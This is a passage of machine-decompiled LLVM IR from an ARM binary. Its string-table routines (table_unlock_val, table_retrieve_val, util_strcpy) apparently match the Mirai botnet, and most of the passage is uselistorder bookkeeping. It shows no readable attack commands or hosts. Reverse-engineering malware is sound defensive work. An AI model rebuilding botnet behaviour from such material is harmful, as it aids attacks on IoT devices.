  %v3_9e78 = udiv i32 %v0_9e78, 256
  %v1_9e7c = add i32 %v2_83b0, 1452
  store i32 %v1_9e7c, i32* %r3.global-to-local, align 4
  %v2_9e80 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_9e80, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_852c.preheader

dec_label_pc_9e9c:                                ; preds = %dec_label_pc_84c0
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_9ea0 = call i32 @table_unlock_val(i32 54)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 54, i32* %r0.global-to-local, align 4
  %v3_9eac = call i32 @table_retrieve_val(i32 54, i32* null)
  store i32 %v3_9eac, i32* %r1.global-to-local, align 4
  %v0_9eb4 = load i32, i32* @r5, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 20
  store i32 %v1_9eb4, i32* @r0, align 4
  %v2_9eb8 = inttoptr i32 %v1_9eb4 to i8*
  %v3_9eb8 = call i32 @util_strcpy(i8* %v2_9eb8, i32 %v3_9eac)
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_9ec0 = call i32 @table_lock_val(i32 54)
  store i32 %v1_9ec0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9ec8:                                ; preds = %dec_label_pc_9cf8
  %v0_9ec8 = load i32, i32* %sb.global-to-local, align 4
  %v0_9ecc = load i32, i32* @r6, align 4
  store i32 %v0_9ecc, i32* %r1.global-to-local, align 4
  %v1_9ed0 = add i32 %v0_9ec8, 789
  store i32 %v1_9ed0, i32* @r0, align 4
  %v2_9ed4 = inttoptr i32 %v1_9ed0 to i8*
  %v3_9ed4 = call i32 @util_strcpy(i8* %v2_9ed4, i32 %v0_9ecc)
  store i32 %v3_9ed4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9d08

dec_label_pc_9edc:                                ; preds = %dec_label_pc_84c0
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9ee0 = call i32 @table_unlock_val(i32 51)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v3_9eec = call i32 @table_retrieve_val(i32 51, i32* null)
  store i32 %v3_9eec, i32* %r1.global-to-local, align 4
  %v0_9ef4 = load i32, i32* @r5, align 4
  %v1_9ef4 = add i32 %v0_9ef4, 20
  store i32 %v1_9ef4, i32* @r0, align 4
  %v2_9ef8 = inttoptr i32 %v1_9ef4 to i8*
  %v3_9ef8 = call i32 @util_strcpy(i8* %v2_9ef8, i32 %v3_9eec)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9f00 = call i32 @table_lock_val(i32 51)
  store i32 %v1_9f00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9f08:                                ; preds = %dec_label_pc_84c0
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9f0c = call i32 @table_unlock_val(i32 50)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v3_9f18 = call i32 @table_retrieve_val(i32 50, i32* null)
  store i32 %v3_9f18, i32* %r1.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r5, align 4
  %v1_9f20 = add i32 %v0_9f20, 20
  store i32 %v1_9f20, i32* @r0, align 4
  %v2_9f24 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f24 = call i32 @util_strcpy(i8* %v2_9f24, i32 %v3_9f18)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9f2c = call i32 @table_lock_val(i32 50)
  store i32 %v1_9f2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9f34:                                ; preds = %dec_label_pc_84c0
  store i32 52, i32* %r0.global-to-local, align 4
  %v1_9f38 = call i32 @table_unlock_val(i32 52)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r0.global-to-local, align 4
  %v3_9f44 = call i32 @table_retrieve_val(i32 52, i32* null)
  store i32 %v3_9f44, i32* %r1.global-to-local, align 4
  %v0_9f4c = load i32, i32* @r5, align 4
  %v1_9f4c = add i32 %v0_9f4c, 20
  store i32 %v1_9f4c, i32* @r0, align 4
  %v2_9f50 = inttoptr i32 %v1_9f4c to i8*
  %v3_9f50 = call i32 @util_strcpy(i8* %v2_9f50, i32 %v3_9f44)
  store i32 52, i32* %r0.global-to-local, align 4
  %v1_9f58 = call i32 @table_lock_val(i32 52)
  store i32 %v1_9f58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

; uselistorder directives
  uselistorder i32 %v2_9e80, { 1, 0 }
  uselistorder i32 %v1_9e7c, { 1, 0 }
  uselistorder i32 %v0_9e78, { 0, 2, 1 }
  uselistorder i32 %v1_9e60, { 1, 0 }
  uselistorder i32 %v1_9d74, { 1, 0, 2 }
  uselistorder i8 %v4_9cd8, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9ccc, { 0, 2, 3, 1 }
  uselistorder i1 %v7_9cc4, { 1, 0 }
  uselistorder i32 %v1_9cb4, { 1, 0, 2 }
  uselistorder i1 %v7_9cb0, { 1, 0 }
  uselistorder i1 %v9_9ca8, { 1, 0 }
  uselistorder i32 %v0_9c6c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9bcc, { 1, 0 }
  uselistorder i32 %v2_9ba8, { 1, 0, 2 }
  uselistorder i32 %v1_9ba0, { 1, 0, 2 }
  uselistorder i32 %v1_9b28, { 0, 2, 1 }
  uselistorder i32 %v0_9b28, { 0, 2, 1 }
  uselistorder i32 %v2_9a9c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i8 %v4_9a74, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9a68, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9a60, { 1, 0 }
  uselistorder i32 %v1_9a50, { 1, 0, 2 }
  uselistorder i1 %v7_9a4c, { 1, 0 }
  uselistorder i32 %v0_9a0c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_99d0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_99b4, { 1, 0, 2 }
  uselistorder i32 %v4_99ac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_98d4, { 1, 0 }
  uselistorder i32 %v0_9898, { 1, 0 }
  uselistorder i32 %v0_9d74, { 1, 0 }
  uselistorder i1 %v7_9854, { 1, 0 }
  uselistorder i32 %v0_983c, { 1, 0 }
  uselistorder i32 %v2_982c, { 1, 0, 2 }
  uselistorder i32 %v1_97f8, { 1, 0 }
  uselistorder i32 %v0_97f8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_9790, { 1, 0 }
  uselistorder i32 %v5_978c, { 1, 3, 6, 4, 5, 2, 0, 7, 8 }
  uselistorder i32 %v2_9774.v4_975c, { 1, 0, 2 }
  uselistorder i1 %v7_9738, { 1, 0 }
  uselistorder i32 %v1_9618, { 1, 0, 2 }
  uselistorder i32 %v1_9610, { 1, 0 }
  uselistorder i1 %v7_95f8, { 1, 0 }
  uselistorder i32 %v5_95f4, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_95dc.v4_95c4, { 1, 0, 2 }
  uselistorder i1 %v7_95a4, { 1, 0 }
  uselistorder i32 %v0_950c, { 1, 0 }
  uselistorder i32 %v0_94f4, { 1, 0 }
  uselistorder i32 %v0_94f8, { 1, 0 }
  uselistorder i32 %v1_94d0, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_949c, { 1, 0 }
  uselistorder i1 %v7_9464, { 0, 2, 1 }
  uselistorder i32 %v1_9488, { 1, 0 }
  uselistorder i32 %v3_9480, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %v0_9474, { 1, 0 }
  uselistorder i1 %v7_93e8, { 1, 0 }
  uselistorder i32 %v5_93e4, { 5, 4, 2, 3, 1, 0, 6, 7 }
  uselistorder i32 %v2_93cc, { 1, 0, 2 }
  uselistorder i32 %v2_93c8, { 1, 0, 2 }
  uselistorder i32 %v1_93b4, { 0, 2, 1 }
  uselistorder i32 %v4_93ac, { 1, 2, 0, 3 }
  uselistorder i1 %v7_937c, { 1, 0 }
  uselistorder i1 %v7_9314, { 1, 0 }
  uselistorder i32 %v5_9310, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_92f8.v4_92e0, { 1, 0, 2 }
  uselistorder i1 %v7_92b0, { 1, 0 }
  uselistorder i1 %v7_923c, { 1, 0 }
  uselistorder i32 %v5_9238, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9220.v4_9208, { 1, 0, 2 }
  uselistorder i1 %v7_91e4, { 1, 0 }
  uselistorder i1 %v7_9164, { 1, 0 }
  uselistorder i32 %v5_9160, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9148.v4_9130, { 1, 0, 2 }
  uselistorder i1 %v7_9110, { 1, 0 }
  uselistorder i1 %v7_90e4, { 1, 0 }
  uselistorder i1 %v7_90bc, { 1, 0 }
  uselistorder i32 %v0_9078, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9048, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_8fe0, { 1, 0 }
  uselistorder i32 %v2_8fd4, { 1, 0 }
  uselistorder i32 %v1_8fd4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8fc8, { 1, 0 }
  uselistorder i32 %v3_8fac, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_8f8c, { 1, 0 }
  uselistorder i32 %v2_8f80, { 1, 0 }
  uselistorder i32 %v1_8f80, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8f74, { 1, 0 }
  uselistorder i32 %v3_8f58, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_8f14, { 1, 0 }
  uselistorder i32 %v5_8ef0, { 1, 2, 3, 0 }
  uselistorder i1 %v7_8ed8, { 1, 0 }
  uselistorder i32 %v3_8ebc, { 1, 0 }
  uselistorder i32 %v0_8e78, { 1, 0 }
  uselistorder i32 %v3_8e44, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_8e44, { 1, 0 }
  uselistorder i32 %v0_8e44, { 1, 0 }
  uselistorder i32 %v3_8e2c, { 1, 0, 2 }
  uselistorder i32 %v0_8e20, { 1, 2, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i1 %v7_8d9c, { 1, 0 }
  uselistorder i32 %v4_8d90, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8d60, { 1, 0 }
  uselistorder i32 %v2_8d50, { 1, 0 }
  uselistorder i32 %v2_8d44, { 1, 0 }
  uselistorder i32 %v1_8d44, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8d38, { 1, 0 }
  uselistorder i32 %v3_8d1c, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_8d00, { 0, 2, 1 }
  uselistorder i32 %v2_8cd8, { 1, 0 }
  uselistorder i32 %v1_8cd8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8cd8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_8cc4, { 1, 0 }
  uselistorder i32 %v3_8ca4, { 1, 0, 2 }
  uselistorder i32 %v1_8c08, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8aac, { 1, 0 }
  uselistorder i32 %v3_888c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8838, { 2, 1, 0, 3 }
  uselistorder i32 %v3_8834, { 1, 0 }
  uselistorder i32 %v3_8828, { 2, 0, 1 }
  uselistorder i1 %v7_8814, { 1, 0 }
  uselistorder i32 %v3_880c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_87e4, { 1, 0 }
  uselistorder i1 %v7_87dc, { 1, 0 }
  uselistorder i32 %v3_87c0, { 1, 0 }
  uselistorder i32 %v1_87a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_87a0, { 0, 2, 1 }
  uselistorder i32 %v2_879c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8788, { 1, 0, 2 }
  uselistorder i32 %v1_8748, { 1, 0 }
  uselistorder i32 %v2_8728, { 1, 0 }
  uselistorder i32 %v1_8728, { 2, 0, 1, 3 }
  uselistorder i32 %v1_871c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_8728, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_870c, { 1, 0 }
  uselistorder i32 %v3_8700, { 1, 0, 2 }
  uselistorder i1 %v7_865c, { 1, 0 }
  uselistorder i32 %v3_8658, { 1, 3, 2, 0, 4, 5 }
  uselistorder i1 %v7_8634, { 1, 0 }
  uselistorder i32 %v4_860c, { 2, 1, 0 }
  uselistorder i8 %v3_860c, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_860c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_88b0, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_85d4, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i1 %v7_85cc, { 1, 0 }
  uselistorder i1 %v7_85c4, { 1, 0 }
  uselistorder i1 %v7_85bc, { 1, 0 }
  uselistorder i32 %v1_85bc, { 1, 0 }
  uselistorder i1 %v7_85b4, { 1, 0 }
  uselistorder i1 %v7_85ac, { 1, 0 }
  uselistorder i32 %v1_8590, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_8530, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i8* %v1_88f0, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_8710, { 0, 15, 1, 2, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 13, 11, 14, 12, 24 }
  uselistorder i32 %v1_9e84, { 1, 0, 2 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20864.0.ph, { 1, 0 }
  uselistorder i32 %v3_850c, { 1, 0 }
  uselistorder i32 %v0_850c, { 1, 0, 2 }
  uselistorder i32 %v2_84d8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_84cc, { 1, 0, 2 }
  uselistorder i32 %v0_84c0, { 1, 0 }
  uselistorder i32 %v5_84b8, { 1, 0 }
  uselistorder i32 %v0_8484, { 1, 2, 0, 3 }
  uselistorder i32 %v0_840c, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_83e0, { 1, 0 }
  uselistorder i32 %v2_83b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_839c, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8390, { 0, 1, 3, 2 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32* %v11_82f4, { 2, 0, 1, 3 }
  uselistorder i32 %v10_82f0, { 22, 21, 20, 12, 11, 18, 17, 16, 19, 15, 14, 33, 32, 31, 29, 28, 30, 27, 26, 13, 24, 23, 10, 9, 8, 25, 7, 39, 38, 37, 35, 36, 34, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_82e8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82d8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82c8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_82a0, { 1, 0, 2 }
  uselistorder i8* %tmp168, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_827c, { 0, 29, 35, 36, 37, 38, 1, 32, 2, 3, 33, 34, 39, 17, 18, 4, 28, 5, 6, 30, 31, 40, 7, 26, 8, 27, 9, 41, 10, 11, 24, 25, 42, 12, 21, 13, 22, 23, 43, 14, 15, 19, 20, 44, 45, 46, 16, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 %v5_8274, { 1, 0 }
  uselistorder i32 %v6_81fc, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 42, 40, 41 }
  uselistorder i32* %sb.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 11, 28, 29, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 30, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 3, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 93, 39, 40, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 41, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 148, 149, 150, 151, 155, 156, 152, 153, 154, 157, 158, 159, 117, 118, 119, 120, 121, 122, 123, 125, 124, 2, 127, 128, 126, 1, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 117, 118, 120, 121, 119, 122, 123, 125, 124, 93, 94, 95, 96, 97, 98, 2, 99, 100, 1, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 39, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 74, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 159, 135, 160, 161, 162, 163, 164, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 1, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 18, 15, 14, 16, 139, 19, 136, 222, 58, 29, 20, 22, 21, 23, 25, 24, 27, 26, 30, 28, 31, 33, 32, 34, 36, 35, 38, 37, 42, 39, 40, 41, 43, 44, 46, 45, 48, 47, 49, 50, 51, 53, 52, 54, 55, 56, 59, 57, 61, 60, 62, 64, 63, 65, 68, 66, 67, 70, 69, 74, 71, 72, 73, 75, 77, 76, 79, 78, 80, 82, 81, 84, 83, 85, 86, 88, 87, 89, 90, 92, 91, 94, 93, 96, 95, 97, 99, 98, 100, 101, 102, 104, 103, 106, 105, 107, 109, 108, 110, 112, 111, 114, 113, 115, 117, 116, 118, 121, 119, 120, 123, 122, 125, 124, 126, 128, 127, 129, 131, 130, 133, 132, 134, 137, 135, 140, 138, 142, 141, 144, 143, 146, 145, 149, 147, 148, 151, 150, 152, 154, 153, 155, 158, 156, 157, 160, 159, 162, 161, 163, 165, 164, 166, 168, 167, 169, 170, 171, 173, 172, 175, 174, 176, 178, 177, 179, 181, 180, 182, 183, 184, 186, 185, 188, 187, 189, 191, 190, 192, 194, 193, 195, 197, 196, 198, 199, 201, 200, 203, 202, 206, 204, 205, 209, 207, 208, 212, 210, 211, 213, 215, 214, 216, 218, 217, 220, 219, 221, 223, 224, 226, 225, 229, 227, 228, 231, 230, 232, 234, 233, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 338, 339, 341, 340, 342, 343, 344, 287, 289, 288, 291, 290, 294, 293, 292, 298, 295, 296, 297, 17, 301, 299, 300, 302, 303, 304, 305, 306, 307, 1, 309, 308, 310, 311, 312, 314, 313, 315, 317, 316, 318, 319, 320, 321, 323, 322, 325, 324, 327, 326, 329, 328, 331, 330, 332, 333, 334, 335, 336, 337, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 50, 51, 52, 53, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32* %fp.global-to-local, { 0, 34, 1, 3, 2, 4, 5, 6, 7, 28, 27, 31, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 32, 33, 35, 36 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 101, 94, 95, 96, 97, 98, 99, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 140, 139, 141, 142, 147, 149, 148, 143, 144, 145, 146, 150, 151, 152, 153, 114, 115, 123, 124, 116, 117, 118, 119, 120, 121, 122, 125, 0, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 63, 61, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 106, 100, 101, 102, 103, 104, 105, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 152, 153, 158, 160, 159, 154, 155, 156, 157, 161, 162, 163, 164, 165, 121, 122, 123, 131, 132, 124, 125, 126, 127, 128, 129, 130, 133, 0, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151 }
  uselistorder i32 50, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 51, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3a4.59 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b394.55 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b38c.53 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b380.51 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b388.49 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b360.37 to i32), { 0, 2, 1, 3 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 49, { 0, 2, 1, 3 }
  uselistorder i32 43, { 1, 4, 2, 5, 0, 6, 3, 7 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1b368.30 to i32), { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9e44, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9d08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9ce8, { 2, 0, 1 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_9ab4, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %dec_label_pc_9a88, { 2, 0, 1 }
  uselistorder label %.thread41, { 1, 0 }
  uselistorder label %dec_label_pc_99ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9918, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_98cc, { 1, 0 }
  uselistorder label %dec_label_pc_98a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9898, { 1, 0 }
  uselistorder label %.thread37, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_9654, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_9550, { 0, 2, 1 }
  uselistorder label %dec_label_pc_94a4, { 1, 0 }
  uselistorder label %dec_label_pc_949c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9474, { 1, 0 }
  uselistorder label %dec_label_pc_9438, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %bb195, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_934c, { 2, 1, 0 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %.thread26, { 3, 0, 1, 2 }
  uselistorder label %bb188, { 1, 0 }
  uselistorder label %.thread25, { 3, 0, 1, 2 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %.thread24, { 1, 0 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %dec_label_pc_9080, { 1, 0 }
  uselistorder label %dec_label_pc_8f38, { 1, 0 }
  uselistorder label %dec_label_pc_8e08, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d74, { 1, 2, 0 }
  uselistorder label %bb180, { 1, 0 }
  uselistorder label %dec_label_pc_8c84, { 1, 0 }
  uselistorder label %dec_label_pc_8c6c, { 1, 0 }
  uselistorder label %dec_label_pc_8c30, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_88bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_87ec, { 7, 8, 9, 10, 11, 1, 12, 13, 2, 14, 15, 3, 16, 0, 6, 4, 5 }
  uselistorder label %dec_label_pc_87b4, { 1, 0 }
  uselistorder label %dec_label_pc_85f4, { 5, 0, 1, 2, 6, 4, 3, 7 }
  uselistorder label %dec_label_pc_8570.dec_label_pc_8570_crit_edge, { 1, 0 }
